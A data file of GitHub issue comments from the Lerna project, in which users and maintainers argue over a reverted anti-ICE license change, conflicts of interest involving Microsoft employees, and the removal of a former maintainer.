lerna/lerna/1628/417057188,1628,"@friend i would personally appreciate some certainty around this, because if you're likely to release this under a patch version I now need to go through all my clients' repos to make sure they're using lock files, fixed versions or a fork. Not because my clients are Microsoft et al but because they have contractually approved lists of licenses that we can use and this license will not qualify. The intent is pretty clear, but the unfortunate side effect is that it also screws with many developers who use this tool. I know this wasn't your intention but it sucks if I have to spend my evening checking a bunch of old repos because you'll maybe release this as a patch. ",,False
lerna/lerna/1628/417058635,1628,"I left the Lerna project a long time ago, I've gone as far as to replace Lerna with a new tool called Bolt. All technology is political, open source is especially political. It would not exist if not for political reasons. Open sourcing something is in itself a political act. We'll release it as major ",,False
lerna/lerna/1628/417059200,1628,Once upon a time I thought I had to go work for those big corporations that I hate in order to do the kind of open source work I want to do. That turned out to be incredibly false. So I fucked off and told them to eat shit. ,,False
lerna/lerna/1628/417060692,1628,"As long as you're maintaining the repository and represent it in the face of other contributors and open source community members - no, you did not. Maintainer is a part of a project. ",,False
lerna/lerna/1628/417061005,1628,Cool story ,,False
lerna/lerna/1639/355626789,1639,"While choosing to close  @friend writes It's not clear what specifically such an RFC would look like, and what it's format would take. Since then no issue has been opened, and it seems clear the maintainers of the project would like to prevent open discussion of the license issue until this particular controversy has lost its heat and fewer folks are paying attention. This issue is simply to register there is dissent among a portion of Lerna users about the decision of the core team to revert Jamie's license change and remove him from the project until an RFC can be opened. It is precisely the time when people are paying attention when discussion is necessary, when a wider group of perspectives can be heard. ",,False
lerna/lerna/1639/417363872,1639,"My simple question, given the lack of due discussion for the previously MIT license modification, would the maintainers be open to a new PR with legally more robust language along with input from the community? I definitely think the previous process was rushed, but the core idea is worth exploring. ",,False
lerna/lerna/1639/417366858,1639,"I think a good idea would be to close this issue, cool down for a week or two, and then open the RFC. ",,False
lerna/lerna/1639/417369880,1639,"@friend I disagree. It is relevant for two reasons  There is significant dissent about the decision to revert the changes in the Licenses and remove Jamie, and an RFC was suggested as a mechanism for discussion, but does not exist. This is a placeholder to simply register there is unaddressed dissent and a promise of a future conversation.  There seems to be a fear of having a discussion while things are ""heated"" -- I would argue that this is a good time to have discussion, as it's the time when there is likely to be the widest set of perspectives and the most voices are likely to be heard.   ",,False
lerna/lerna/1639/417373249,1639,"Calls for ""civility"" and ""cooling down"" are invariably intended to cease discussion, not enhance it. Hannah's right - the time to discuss is now. ",,False
lerna/lerna/1639/417381205,1639,"If you want to restrict who can use lerna, then lerna can no longer be called free; it will be proprietary. Please let everyone know with advance notice so they can make preparations to move away from it if it's going to become proprietary software. ",,False
lerna/lerna/1639/417382922,1639,"I made you all a fork, case closed, you can change the license to non-free. @friend  I do doubt the ability of humans to make rational decisions during heated discussions. In law, courts even recognized this fact as a valid defense for making bad and illegal choices. ",,False
lerna/lerna/1639/417384713,1639,"I don't think anyone's particularly heated, just excited to talk about this. 🙂 ",,False
lerna/lerna/1639/417387677,1639,"I see these as two separate issues. If the community and the maintainers want to use a modified MIT license, that is fully within their right. However, Jamie's behavior was plainly abusive and in violation of the CoC. ",,False
lerna/lerna/1639/417404448,1639,"Jamie's removal was a necessity and shouldn't be open for debate. Blocking people from contributing because they disagreed, which eventually lead to him blocking everyone but contributors, attacking companies/individuals, claiming community tools (like Babel) are ""his"" is overwhelming evidence that he violated the CoC. @friend Calls for civility are perfectly apt after an issue like this. Suggesting that asking people to ""be nice"" is an attempt at ending discussion is one of the strangest stretches I've ever heard. As someone that called maintainers cowards for reverting the changes and removing Jamie, I can get a strong sense of why you'd argue that point, however. As for this issue, @friend made it pretty clear that they'd like to wait for the dust to settle prior to a formal RFC. That makes sense. Right now Lerna is a target for people only interested in politics, and once the dust settles they will likely have something new to chase, and the people actually interested in the project can contribute to the suggested RFC. ",,False
lerna/lerna/1639/417411684,1639,"""Right now Lerna is a target for people only interested in politics"" -- I am a professional coder. I am interested in code. I am also interested in politics, FWIW. Given the original issue was a political one, it seems particularly important that a wide variety of political perspectives are included. To wait until there is a safe space for those ""only interested in code"" excludes a variety of political views, as the idea that politics and code can and should be separate is itself a political position that many disagree with. I am not personally prepared to say Jamie's removal is a settled issue because the announcement he is being removed does not include any accounting or transparency on what specific violations the maintainers feel occurred. But I agree it is a separate question, except in as much the maintainers announced it in the same PR where they reverted the license change, suggesting they consider the two issues intertwined. ",,False
lerna/lerna/1639/417412284,1639,"@friend making a fork suggests you are engaging in this discussion in bad faith, and would simply like people who have a different viewpoint to go away. ",,False
lerna/lerna/1639/417416333,1639,"@friend If the broader open-source community wants to discuss the politics of this, they should do so in a forum that makes sense. The Lerna repo isn't that forum. This repo is intended for end-users and maintainers of the project. As such, decisions about the goals and motivations of the project should be made by the Lerna community. I realize some people feel like open source maintainers need to write books for every decision they make, but I disagree. It was decided by multiple maintainers that he violated the CoC. That's subjective, absolutely, but debating the issue to death isn't suddenly going to give us objectivity. ",,False
lerna/lerna/1639/417443420,1639,"The purpose isn't objectivity, it's transparency. ",,False
lerna/lerna/1639/417448135,1639,"@friend Justin your implication that commenters have no relation to Lerna is unsubstantiated. I for one am actively involved in the ecosystem surrounding Lerna and have been preparing to add Lerna to a project I maintain, although I am now considering alternative options. ",,False
lerna/lerna/1639/417450440,1639,"Let's test if that's the actual goal (Emphasis added by me) Per  could probably stop here. That's enough for removal. Full stop.  Blocking people on the lerna repository that politely called him out. Blocking all non-contributors on the repo from posting issues/comments/PR's  Per  he may not do a major version bump  This is in addition to his horrible conduct in every issue posted regarding adding his company restrictions to the MIT license. That's pretty transparent. That's pretty objectively trolling, personal attacks and insults. Now the question is, do you really want transparency, or are you looking for a fight? ",,False
lerna/lerna/1639/417452135,1639,"@friend I made no such implication. I said, quite explicitly, that Lerna is currently a target for those disinterested in the project and overly interested in the politics. By waiting for the dust to settle, we can ensure that any RFC is targeting the actual community. I'm not suggesting that everyone that supported Jamie is a troll, I'm saying that right now Lerna is going to attract them. Wait a few days and they'll be busy trolling someone else so we can get active interest in the discussion, including those that disagree with reverting the change. ",,False
lerna/lerna/1639/417453569,1639,"Re ""cooling off"" and ""people interested only in politics""... I'm seeing an extremely ill-informed opinion being bandied about that implies the current state of open source is apolitical. FSF was founded on some radically collectivist ideals. OSI on more radically libertarian ones. ""Open source principles"" are what they are because people planted the flag and did the work to make them that way. The reason this project is MIT instead of GPL in the first place is because of decades of ideological debate and changes in community expectations. Planting a different flag and doing a different thing is not more or less political than the status quo. To suggest otherwise is ahistorical nonsense. It's not more political; it's merely more participatory. I'm simultaneously intrigued by the effort to change the license and skeptical of what its effects might be. Maybe reverting was a good idea! It would have for sure been more interesting to see the experiment run its course, but I understand the fear to the health of the project that makes someone walk it back. Of course this attracted wider attention. Of course people who were otherwise mostly foreign to lerna were intrigued and came running. You were doing something mad and exciting and extremely political. A big project was finally taking an ethical question and putting it front and center and saying ""Yeah, it's time to talk about this."" Post-blowback, you don't wanna be political pioneers anymore. And who does? A) It's hard, and B) that's not how most of us want to spend our OSS time. If you're overwhelmed, frazzled, can't handle being the center of this ethical discussion you started, and just want to be left alone to code now... You could just say so? I mean that completely earnestly. It's okay to get in over your head and ask to be let back out. At least I think so. ",,False
lerna/lerna/1639/417454263,1639,@friend transparency for a decision comes from the people who made the decision. Right now what we have is You and I can quibble indefinitely over whether the things you posted are actually CoC violations. The point is neither of us are maintainers. ,,False
lerna/lerna/1639/417455121,1639,"@friend really amazing point. the fear seems to be if we open ourselves to political discussions how will we get our important professional work done.... but the very idea that open source/FSF is the domain where important money making professional work gets done, not where academic and politically radical weirdos hang out in their spare time, is pretty darn new. And that we're at this point it's the work of fairly intense political advocacy and organizing. ",,False
lerna/lerna/1639/417459459,1639,"Please have patience with me. I don't have a lot of spoons right now, between dealing with an unprecedented (for me) deluge of Twitter notifications and staving off suicidal ideation. ",,False
lerna/lerna/1639/417460373,1639,"FWIW @friend is right that Lerna is getting much attention, eg see this Vice motherboard news article. I did not know about this project myself till I saw the debate.  ",,False
lerna/lerna/1639/417461491,1639,"@friend Thank you for speaking up and registering your dissent and representing the dissent of like-minded Lerna users. As an open source project we have every right to provide no reason for his removal. However, as stewards of transparency, trust, and care for our users and the lerna ecosystem, we will provide clarity. According to the current Lerna Code of Conduct Additionally our rights as Org Members of the project for handling unacceptable behavior which do not align with the current Code of Conduct. These are the segments of the current lerna Code of Conduct that justify our decisions made to revoke all of James involvement and ownership privileges over this GitHub Organization. In multiple GitHub issues (if you need me to cite them, I will do so but in additional comments or edits from this response), on Twitter [important to note he claims ownership of lerna in this context making him profesionally represented and in the capacity of a maintainer] acts in a very unprofessional, rude, and harassing manner. These also have been occurring since July which @friend official states in our license change PR #1633 that we made a mistake in this regard to not address earlier violations in a swift and timely manner. As a core team, going forward, we want to not only protect the interest of the project itself, but also the transparency of the project. And that means we need to adopt a much less vague, less interpretive, and more structured Code of Conduct. For that we have open up #1636 per request (I on twitter officially asked Coraline to create this issue). On behalf of the core team who is all actively monitoring this issue, I hope it provides the clarity that you are seeking. Thank you for sticking up for a transparent and responsible process. Note @friend once you have your clarifications received (even if you don't explicitly request them), would you confirm your question has been answered? That way I can prevent thread abuse by locking and maintainers can add cited incidents in the issue. ",,False
lerna/lerna/1639/417462982,1639,Cannot speak for @friend or others but @friend I think where I need additional clarity is  Why did you decide to revert the license change despite maintainers having originally been involved in approving it? Why did you choose to link Jamie's dismissal with the license change? Why did you open a pull request to remove your own employer (Microsoft) from the restricted list?  ,,False
lerna/lerna/1639/417464211,1639," did he keep opening so many issues, harassing other people and why did he repeatedly refer to these free software projects that many people have contributed to as ""my tools""? Is all the code his property? Are all the contributions by everyone else worthless? ""I kinda hope they do try to keep using my tools though"" - From the motherboard article, emphasis added ""Also, stop using my tools (such as Babel)"" - from /palantir/tslint/issues/4132 Babel is his property as well? Can someone help my understand why these are his property? Thanks. ",,False
lerna/lerna/1639/417468816,1639,@friend Those questions aren't relevant to the thread. You'd have to ask Jamie himself. ,,False
lerna/lerna/1639/417471514,1639,"I did not decide to revert the license change, I approved it. This decision was made by @friend and his resoning is very clear in #1633. I did not link Jamie's dismissal. @friend explained his reasoning in #1633 I thought Microsoft was being treated unfairly and wanted to set the story straight. ",,False
lerna/lerna/1639/417476331,1639,@friend Those questions are relevant to the thread. Read the title of the thread. ,,False
lerna/lerna/1639/417476606,1639,"@friend I disagree that this is very clear ""the impact of this change was almost 100% negative, with no appreciable progress toward the ostensible goal aside from rancorous sniping and harmful drama."" The claims made here are not supported by evidence or arguments. This was the plural ""you"" here, as in ""you, the maintainers."" In any case, I still don't understand why Jamie's dismissal was linked as part of the same announcement, clearly implying that his dismissal had to do with his introduction of the modified MIT license. Respectfully, given the conflict of interest between your role as a maintainer and your role as a Microsoft employee, I think you should have sat out of that decision. It certainly appears to many as though your loyalty to your employer influenced the revert back to the old license. ",,False
lerna/lerna/1639/417478662,1639,It did not. Please stop repeating this baseless canard. ,,False
lerna/lerna/1639/417479254,1639,"@friend this is transparently absurd. You can't just say ""I'm not influenced by the company who pays me"" and thus make it so. I sometimes laugh at the Twitter refrain of ""tech workers need to be trained in ethics,"" but perhaps it's true. ",,False
lerna/lerna/1639/417479261,1639,"@friend If you're looking for ""rancorous sniping and harmful drama"" you might try using a mirror. ",,False
lerna/lerna/1639/417479641,1639,"Explain how me, the person who made the decision, not employed by Microsoft, was secretly paid by Microsoft to ruin open source. Should be an amusing story. ",,False
lerna/lerna/1639/417480011,1639,"You explicitly stated on Twitter that changes were being made after speaking with Sean, a Microsoft employee. If this isn't what happened, then what did happen is certainly hard to follow. ETA in case it's not clear I have never suggested you were secretly paid; that's not the point. ",,False
lerna/lerna/1639/417481140,1639,"I made the decision after speaking with Sean. It is possible to talk to somebody and then make an independent decision. If that's hard to believe, it's not my problem. ",,False
lerna/lerna/1639/417481868,1639,"@friend Feel free to show appreciable change as a result of this. At Amazon someone sent an email that said ""Don't use lerna above version v3.2.1"". I could just feel ICE crumbling under the pressure. Yes, only people with no vested interest in this can be involved in the decision making.  That makes a ton of sense. ",,False
lerna/lerna/1639/417486430,1639,"I would refer you to this comment. Up to you whether you consider this ""appreciable,"" but I suspect because you don't see direct, large results (e.g. MSFT didn't turn around and cancel its ICE contracts), you're not likely to consider this ""appreciable."" I personally think this action has definitely moved the needle on this issue. Court judges recuse themselves from decisions involving conflicts of interest all the time. The idea that one might have such a conflict and thus should not be involved in the decision is not particularly far-fetched. That said, I don't really have a problem with his involvement here. Sean is well-versed in open-source and would be worthwhile to consult regarding the impact of this decision. ",,False
lerna/lerna/1639/417486905,1639,"The damage has already been done. If the Lerna project was serious about its future after this trashing of it's credibility, it would strictly prohibit and immediately purge all social justice warriors from it's ranks. ",,False
lerna/lerna/1639/417487240,1639,"Because a guy among 10s of thousands was going to put up the big fight to stay off the list, and now can't because it doesn't exist anymore. I suppose, instead, he can now argue to not have contracts with ICE, but then this silly move wouldn't get any credit. Jamie already had a conflict of interest in targeting specific companies he didn't like. Your argument here would imply only people that are independent should play a role in the decision-making. Except nobody is independent. ",,False
lerna/lerna/1639/417490645,1639,"@friend I'm inclined to view this like a roach one person visible is indicative of a lot more you don't see. The point is that this caused at least one person to publicly say ""this resulted in me fighting to oppose ICE contracts."" I believe that's resulted in a lot more people than just him doing similar things. I know I've had a few conversations with people who hadn't previously considered the issue before this. That's not a conflict of interest. Judges don't recuse because of what they believe; they recuse themselves because they have a material interest in the result of the ruling, e.g. they've invested stocks in the companies involved. You're correct that nobody is independent, because no one is objective, but conflicts of interest and lack of independence are not synonymous.  All of that said, we're getting off topic from the purpose of the thread. I'm happy to continue this offline if you'd like. ",,False
lerna/lerna/1639/417494363,1639,"@friend I know you're dealing with a lot more than you expected right now but I'm afraid that as the maintainer of a project with a decently-sized community it really is your problem. I don't envy you it. I frankly don't know if it's even possible to clear it up completely at this point. At a charitable reading, @friend seems to have jumped in feet-first without thinking about what it looks like for a Microsoft employee to get involved in a situation which affects Microsoft's access (particularly given that Microsoft is in fact well known to have an active engagement with ICE, &amp; that the original license change didn't allow for equivocation about legacy systems). To be clear, this is how I think it went down too. I've met Sean and he cares a lot about open-source communities and open-source projects. But there are less charitable readings which are equally plausible from what's publicly known, or even just public on GitHub vs public on Twitter. You know as well as I do that ""big MS puts the screws to open-source project"" is a headline going back years and years, and Sean's involvement in any capacity with this chain of events means you've inadvertently leaned into that old stereotype. ",,False
lerna/lerna/1639/417502379,1639,"@friend I wish I could say your response made me feel discussion should be locked on this issue and consider it resolved. Unfortunately, it has the opposite effect for me. What I can see is  A change was made to the license that spoke ill of Microsoft was made that @friend approved of and merged  You, a Microsoft employee, attempted to remove Microsoft, and only Microsoft, from the list of companies in said change (I didn't know that part) @friend then spoke to you, a Microsoft employee, at length, after which the change was reverted. Speaking to you at length was specifically called in the decision to revert.  I am going to assume best intention that you genuinely feel calling out Microsoft was unfair, and you genuinely sought changes because of that, and not in an effort to protect your employer. However, as an employee of one of the companies that were called out in the change, clearly the ethical decision would be for you to recuse yourself from discussions of this issue completely. There's really no way in which you're a vaguely objective party -- or even if you are it's pretty reasonable for other people not to perceive you that way. My original issue (an RFC to reconsider the License) is not addressed, and moreover, I honestly suggest the right course for you all is for @friend to recuse himself from discussion going forward.  When I say ""ethically"" I purely speaking from what I think is right and in terms of staying impartial whenever one is given a governance role. My previous experience to being in tech is on non-profit boards, where for example, you would recuse yourself from any decision that might affect you personally as well as the organization. Obviously there is no legal duty in this case for an informal organization like Lerna *  ",,False
lerna/lerna/1639/417516352,1639,"I am in agreement that Sean does great work for the open source community and I'm really happy about what he's done with webpack. I know he cares a lot and means the best. In fact I'm confident every maintainer involved here cares a lot and had the best intentions. That said, I stand by Hannah's comment above. ",,False
lerna/lerna/1639/417518550,1639,"As an outsider (I've only ever just used Lerna once, ended up coming by because I smelled fire yesterday) This thread, from the outside, is a train wreck. It was opened -- with good intentions -- by someone external, when it should have been opened by someone in the team. It has turned into a means for @friend to be beaten with; at best, this is poor form, at worst, it's harassing the man. I agree with @friend w/r/t baseless canard. I'd honestly hope for better out of the free software community, but I guess the 90s never ended, and it is easier to accuse someone of horrible things than to give them benefit of the doubt. If the Lerna team members think he should recuse himself then that is their choice, but a lynch mob here serves no purpose other than to harass him. I'm going to suggest that this thread be restricted to members of the Lerna team; shy of that, closing this thread and opening one which is restricted to Learna team members. I agree transparency is important -- especially in @friend 's case. Right now, however, this is an issue for the lerna team to hash out and find a point where they feel it's settled to where the general internet can come and see what has happened, voice their thoughts, and a final choice can be made. ",,False
lerna/lerna/1639/417521670,1639,"It's funny how much of the argument is going on trying to express that you all have the same political views but you're too ignorant to really listen to each other. It's always jumping to conclusions that there must be conflicts of interest and conspiracy theories. At what point are people going to realize the arguing you're doing is for the most part wasting time trying to explain to someone, who agrees with you, why they should agree with you. Law is not based on feelings, licenses are law, licenses are not meant to be interpreted by feelings. Whatever they may be the license has to be rigid and precise, any lack thereof leaves the license weak and unenforceable. This isn't so much directed to the Lerna team as much as it is to every single person who is trying to ensure they're on the right side of history and bring the crusade Jamie was trying to create. ",,False
lerna/lerna/1639/417524363,1639,"I work at Amazon, should I also recuse myself from the discussion? This idea that employees of the company are too tainted to discuss the future of a project is absurd. If we want to debate the merits of this decision, which is how it should have gone in the first place, let's do so. But asking anyone to recuse themselves from discussion is the literal opposite of everything opensource is supposed to mean. This entire situation wouldn't exist if it weren't for some poor choices, and at least one of the maintainers realized that. Had this rash choice not been made in the first place, nobody would be here demanding that discussion take place and an RFC on taking Lerna to a non-opensource license would exist. I'm fine if the maintainers want to go that direction, but if I were in their position, my vote would be to close this issue and everybody go back to building software which is supposed to be the point of projects like this. But now that pandoras box has been opened, everyone with an agenda is here to fight for it, so much so, they want to silence anyone with an opinion that differs because ""ethics"" or whatever silly nonsense they can use to make this issue an echo chamber ",,False
lerna/lerna/1639/417530197,1639,"Ethics aren't silly, let's not trivialize them. Software engineers at VW who were asked by their management to implement defeat devices were held criminally liable for poor ethical decisions. ",,False
lerna/lerna/1639/417530704,1639,@friend If you can't see the difference between that and this situation then your opinion isn't that valid. ,,False
lerna/lerna/1639/417531500,1639,"Of course they're different - I'm pointing out that pooh-poohing ""ethical concerns"" as silly nonsense is is trollish. ",,False
lerna/lerna/1639/417531889,1639,"@friend You completely missed the point here. Silencing someone in the name of ethics isn't ethics. @friend explicitly stated that @friend shouldn't even be a part of the discussion for ethical reasons. That's abusing something good (ethics) for a clear agenda. That's after arguing that this discussion has some degree of immediacy so that a broad variety of opinions can be heard. Except, obviously, the opinions of the people that they are well aware disagree with them. It's either dishonest or naive. I choose to assume the latter as that requires the least assumption. But you're correct in that I'm going to call out anyone that tries to abuse something as meaningful as ethics, whether or not it was out of malice or poor judgement. ",,False
lerna/lerna/1639/417532724,1639,"Hey so I don't work at any of the companies involved or know any of the maintainers personally so I don't have any potential ethical dilemmas. Here's my thoughts The key part of the whole conflict of interest idea is that you have to be making a decision on behalf of a 3rd party, and the conflict would give rise to the appearance that you're being unduly influenced by this secondary consideration. I believe @friend made the decision. @friend had no conflict of interest, he's providing his input as a major stakeholder. As long as we all understand his role (and I think we do) then I think we'd be far richer for his input than not. This also makes the assumption that the rash &amp; unannounced decision to change the license was in the project's best interest, where one could easily argue that it was not for all the obvious reasons (community split, legal viability, no community feedback solicited, etc). Generally the notion that someone's involvement with an affected organization means that they can't speak from their expertise would cause all sorts of problems if it were applied to government. As much as lobbyists have (deservedly) earned a bad reputation, they also provide vital guidance to governments so they can make decisions that aren't destructive. So let's get everyone's best opinions in here, and then let the maintainers make their decision. ",,False
lerna/lerna/1639/417535392,1639,"I think this is mostly not accurate. As a maintainer Jamie had the ability to make changes and to persuade the other maintainers. When he made this decision to pursue goals that are unrelated to the project's unstated goal (make multi-package repos easy) he was arguably engaged in his own conflict of interest. That said if he was the only maintainer and decided that he was changing the project's goals, then he could not be in a conflict of interest because his goals and the project's were always aligned. ",,False
lerna/lerna/1639/417538116,1639,"Just for clarification, @friend is not the only Microsoft Employee who has been a part of this ongoing discussion which makes this even more distressing. ",,False
lerna/lerna/1639/417538659,1639,"@friend The only thing distressing is that this entire event took place. You do realize that the big tech companies even let us think for ourselves? I work for Amazon and not a single project in our org uses lerna. I do, personally. This wasn't about bias, this was about virtue signaling, particularly on such a terrible platform for it. Frankly I'm not sure where else this discussion has to go, since it's just boiling down to ""if you work for any of the companies listed you shouldn't have input"". ",,False
lerna/lerna/1639/417551021,1639,"Apologies if this is not an appropriate channel to voice opinions about the contents of the hypothetical RFC mentioned in the title of this issue, but assuming it is, I want to voice that I strongly disagree with the idea of applying Jamie's modified MIT license to Lerna. Not because it has anything to do with ICE, but due to the reasons cited here - TL;DR it would make Lerna fundamentally non-open-source. I think that people that want a fundamentally non-open-source licensed monorepo management project should be prepared to fork Lerna, find maintainers who agree with said non-open-source license, and potentially pay for its ongoing maintenance, rather than be questioning the decision of the mainline Lerna maintainers (namely, @friend who created the PR, as well as @friend and @friend who approved it). The Lerna maintainers are entirely within their rights to do as they please with Lerna. I'd also like to remind everyone involved that an RFC doesn't necessarily mean that dissenters will somehow be able to articulate an overwhelmingly convincing argument and magically overturn the maintainers' decision to retain the unmodified MIT license (or the decision to remove Jamie from the Lerna org). For better or worse, the maintainers are well aware now of the implications of what has transpired and trying to nitpick perceived flaws of logic is, at best, splitting hairs at this point. Lastly, @friend even if there a deluge of people accusing of you supporting political positions that you do not subscribe to, and that is taking an emotional toll on you, please remember that there are also those of us that understand your position on ICE, on OSS and on being publicly vulnerable. I personally believe your standing by the MIT license was the right move, and I'm not alone in thinking this. Stay strong. ",,False
lerna/lerna/1639/417551038,1639,"For left-leaning software devs who are interested in constructively affecting political change, please check out Tech For Campaigns at  , which pairs volunteer expert technologists with Democratic campaigns (even at the state and local level). I'm not affiliated. Using Palantir's open-source tools does serve as promotion / brand-awareness for a company that you might think has abhorrent practices and I do think that there should be room for opening tickets to request a different vendor on that basis alone. Or even a ticket on the open-source provider's repo to request transparency. But there is obviously a reasonable and an unreasonable way to go about that -- opening those issues was a clear waste of good reputation by somebody who could have made real waves with a more level-headed approach. Perhaps community input before big decisions is not a burden but actually serves to prevent bad decisions ",,False
lerna/lerna/1639/417554305,1639,"This whole thing has turned into a tire fire. ""If you don't support us entirely, you're against our cause"" is the most toxic thing ever. In my view, this hurts lerna's reputation. James Kyle's behavior is absolutely disgusting and I support his removal from this project. I'd also support levying a complaint with GitHub since he definitely violating their TOS, but I am not going to do that myself, but I definitely encourage those who were targeted to do so. I do support what was initially done, what needs to happen is that the license is crafted in a way that spells out everything. Make sure that it can't be challenged as being ambiguous. Ambiguity is your enemy here. I am also rather distressed that I was personally emailed and harassed and accused of supporting the disgusting policies of ICE. ICE needs to go and it can't be gone soon enough. Rather than being toxic -- which doesn't advance your cause -- it hurts your credibility because nobody wants to listen to you, consider trying to lobby the companies. I wish people would learn that the kind of stuff James Kyle pulled is absolutely disgusting and hurts the cause, which I support...it was just botched epically. ",,False
lerna/lerna/1639/417554737,1639,Also @friend and the other maintainers -- don't let this take an emotional toll on you -- there are people who do see why it happened the way it did. I'm rational and capable of seeing that what was there initially was horribly botched. I am however kind of curious why it was even approved in the first place? ,,False
lerna/lerna/1639/417557907,1639,"Also, one other thing Microsoft owns GitHub -- maybe make the change after moving to something like GitLab thinking which isn't owned by a company you explicitly excluded in your license... ",,False
lerna/lerna/1639/417557974,1639,"It's frustrating to engage in good faith and assume best intent of others, and get accused of, in the last several comments silencing, virtue signaling, abusing ethics to support an agenda, and engaging only to insure I'm on the right side of history (whatever that means), attempting to make an echo chamber, etc. I stated my own personal view of the ethical way to proceed most likely to maintain the trust of the community. I specifically posited it as a suggestion. Perhaps ethics is the wrong word -- maybe I mean ""best practice"". If it sounded judgemental I'm sorry. The echo chamber accusation sounds seems uniquely weird given this thread is 55 comments worth of multiple perspectives and disagreement.  I personally don't think it's a trash fire, but YMMV. It's specifically the kind of discussion I feel is needed, with people having to think about these questions discuss and disagree. ",,False
lerna/lerna/1639/417559488,1639,"@friend -- I'm regretting ever even entering this discussion as it's just caused me grief and emotional distress. I can't even imagine how @friend is feeling right now -- he has my support 100% -- some of us are rational. Most aren't necessarily against what happened, but HOW it happened. Even still, GitHub would be in their right to terminate James' account since he definitely violated the GitHub TOS. Bullying and harassment is not how you accomplish things. This is wrong and just horrible. I know there are others who got a similar email to the one I received and if you are feeling any distress, you have  my sympathies and such. This is a dumpster fire right now. ",,False
lerna/lerna/1639/417559701,1639,With the exception of a few trolls -- we all agree mostly...with a few people that have some conflicts of interest but I don't feel that they should be excluded from the discussion because of those. ,,False
lerna/lerna/1639/417567438,1639,"@friend in case it wasn't clear, while I disagree with your recommendation I'm confident it was made with the best of intentions and the goal of facilitating the best solution for all. ) ",,False
lerna/lerna/1639/417654227,1639,"Can you social justice warriors stop using (and hence promoting) this platform owned by a major ICE collaborator? Remember just like bad news is good news in show biz, any users and discussions on githib are (or will be in 4 momths) good news for MS. Only you enlightened people can kill Microsoft and consequently ICE in one fell swoop by altogether stopping using github. also somebody pointes out that except launch pad all other major git hosta are equally tainted- so id suggest using that as the signature list or whatever drama you will do next. ",,False
lerna/lerna/1639/417654683,1639,"If the Lerna community does decide to adopt a new licence in the future, I would like to encourage you to pick a licence that has been written and reviewed by lawyers. Regardless of political opinions, ideologies or agendas, copyright licences written by non-lawyers who are unlikely to fully understand the legal ramifications, or otherwise, of the clauses they include are likely not going to be accepted by the wider community of developers; nor the companies they work for that often have internal policies regarding acceptable open source licences for software they can use. The company I work for, and I can only assume many other companies, are taking a very close look at the licence Jamie wrote to understand the impact upon our own codebases. Lerna just happens to be the most high profile case of it being added, and so far the only case I'm aware of where it got reverted. It also got added to his other repositories and NPM packages, which remain a serious concern. I would also strongly advise against attempting to use a copyright licence for political protests against contemporary political issues. Software copyright licences are long-lived documents that can outlive any government-of-the-day that happens to be disrupting or upsetting certain groups of people. It's also likely to be an extremely ineffective, if not completely counter-productive, form of protest that can have potentially far reaching consequences beyond the intended goal, including setting a terrible precedent for the industry. Today, we get a list of companies rejected for working with a government agency carrying out extreme right wing policies. Tomorrow, we get another one from another group of people rejecting companies that support left wing policies. Where does it end? I urge those in the community advocating for either reinstating the licence or creating a new one in a similar vein to just pause and seriously think about what you're trying to achieve, what you can realistically achieve, and the costs of the way in which you attempt to achieve those goals. ",,False
lerna/lerna/1639/417709039,1639,"@friend just because there is dissent is not a good enough reason for there to be a discussion. RFCs are not meant to be vehicles for discussion for the sake of discussion. What matters is the arguments for or against a change, its pros and cons and determining actionable steps. A secondary point to consider is what has already happened. Dissenters will dissent and for many topics, there will never be consensus. Discussing endlessly in those cases is not only not fruitful, but distracting as well. As I understand, the arguments for a modified license are  support for the ideology of protesting against ICE, specifically desire for a voice in the decision process a legitimate desire to use a non-open-source license as a weapon to ""punish the bad guys"" (a view that seemed to be somewhat trollish in nature, from my observations, but I'm putting it here for completeness)  The arguments for keeping MIT  a custom license is restrictive not only to a blacklist, but also any company with a whitelist OSS license policy (i.e. any company of non-trivial size) it potentially sets a dangerous precedent that goes against the ideologies of OSS and FSF it isn't an appropriate - let alone effective - vehicle for political protest, given that actually disrupting ICE operations could at worst even delay reuniting children with their parents due to potential disruptions in logistics systems  Things I believe should not be part of the discussions re license  whether maintainers with conflict of interest should recuse themselves from discussion - the two most prolific Lerna contributors (other than Jamie) do not have conflict of interests and they agreed on the current decision. Whether maintainers decisions were influenced by one person or another should be of no consequence if they made a decision on their own free will. whether maintainers with conflict of interests should have recused themselves prior to the decision - an RFC isn't the place to debate the past, but to determined actionable items (if any) for the future whether more voices would change the decision - unless there are different arguments other than the ones I listed above, more commentary at this point is just going to be rehashes of the same ones that were taken into account the first time around.  ",,False
lerna/lerna/1639/417711213,1639,"Only you have suggested that these discussions are ""for the sake of discussion"". ",,False
lerna/lerna/1639/417711654,1639,It's also really weird to see so many people say  It's harmful to [foss|companies|people] I't not [going to work|effective|doing anything]  ,,False
lerna/lerna/1639/417711904,1639,I'll go ahead and suggest this is discussion for the sake of discussion as well. We certainly aren't talking about anything even remotely relevant to Lerna. ,,False
lerna/lerna/1639/417712047,1639,"Also, @friend @friend is there anything else you'd like to decide we shouldn't discuss? I might as well ask now, since you two are already providing answers. ",,False
lerna/lerna/1639/417712597,1639,"I never said it shouldn't or couldn't be discussed, I said it was discussion for the sake of discussion. Relax buddy, and read what people write before you respond. ",,False
lerna/lerna/1639/417738137,1639,"It's still funny the discussion is primarily ""If you don't revert it you are complacent with separating families!"". Which is a stupid untrue argument. @friend You're providing equal values of absolutely nothing to this discussion. ",,False
lerna/lerna/1639/417766868,1639,"You laid out opinions. You can't just declare a comment to be a ""opinion"" and have it be so. Come on, now. ""An RFC is authored by engineers and computer scientists in the form of a memorandum describing methods, behaviors, research, or innovations applicable to the working of the Internet and Internet-connected systems. It is submitted either for peer review or to convey new concepts, information"" * ""Peer review methods are employed to maintain standards of quality, improve performance, and provide credibility""** I'm more than happy to remove this from the argument list if you think it's not one, though I understand it to be the primary motivation behind the original change by Jamie. It's a fact that engineers in my company would not be able to use software with such a license, for example. There are precedents documented elsewhere for React's old license as well. Yes, as I said, I prefaced those with ""Things I believe should not be part of the discussion"". Those are my opinions. If I may be blunt, it feels like you're acting in bad faith, and I've no interest in drama. @friend ",,False
